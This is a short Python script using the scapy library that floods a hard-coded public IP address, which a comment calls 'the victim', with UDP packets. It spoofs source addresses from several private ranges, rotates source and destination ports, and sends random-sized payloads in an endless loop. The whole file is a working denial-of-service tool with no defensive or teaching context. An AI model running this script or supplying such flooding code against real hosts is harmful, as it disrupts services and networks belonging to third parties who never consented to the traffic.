import sys
import random
import socket
import struct
from scapy.all import *

#list of IPs that we want to be used as source IPs for the udp packets
src_ips = []
for i in range(1,255):
    src_ips.append("192.168.3."+str(i))
    src_ips.append("192.168.4."+str(i))
    src_ips.append("192.168.5."+str(i))
    src_ips.append("192.168.6."+str(i))

# set as destination IP the IP of the host that you want to send the udp packets to
dst_ip="2.86.63.203"

# 3 source ports chosen randomly
src_ports = [50000, 50001, 50002]

# 5 destination ports: telnet port, smtp port, dns port, snmp port, random port
dst_ports=[23, 25, 53, 161, 50005] 

sent = 0 # sent packet counter

# Create socket so that the send function uses the same socket and does not open a new one every time
s = conf.L3socket()

# loop infinetely and send udp packets to the victim with the parameters specified above
while 1:
    src_ip = random.choice(src_ips)
    src_port = random.choice(src_ports)
    dst_port = random.choice(dst_ports)
    size = random.randint(1, 1472)
    s.send(IP(src=src_ip, dst=dst_ip)/UDP(sport=src_port, dport=dst_port)/Raw(RandString(size)))
    print("Sent %s packets from %s to %s at port %s." % (sent, src_ip, dst_ip, dst_port) )
    sent= sent + 1
